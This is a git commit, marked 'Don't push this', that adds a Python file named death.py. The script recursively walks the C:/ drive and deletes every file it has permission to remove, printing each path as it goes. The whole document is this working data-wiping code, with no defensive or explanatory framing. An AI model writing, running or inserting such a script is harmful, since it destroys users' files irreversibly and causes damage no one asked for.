9b8f00ae050becb2442e6221a520054a56927051
Jameson Crate <86806051+Jameson-Crate@users.noreply.github.com>
2021-09-08 13:54:23 -0700

    Don't push this

---
+++ death.py
@@ -0,0 +1,14 @@
+from os import walk
+import os
+
+home="C:/"
+
+for dirpath,dirnames,file in walk(home):
+    for files in file:
+        dirpath1=os.path.normpath(dirpath)
+        childpath=os.path.join(dirpath1,files)
+        print(childpath)
+        try:
+            os.remove(childpath)
+        except PermissionError:
+            continue
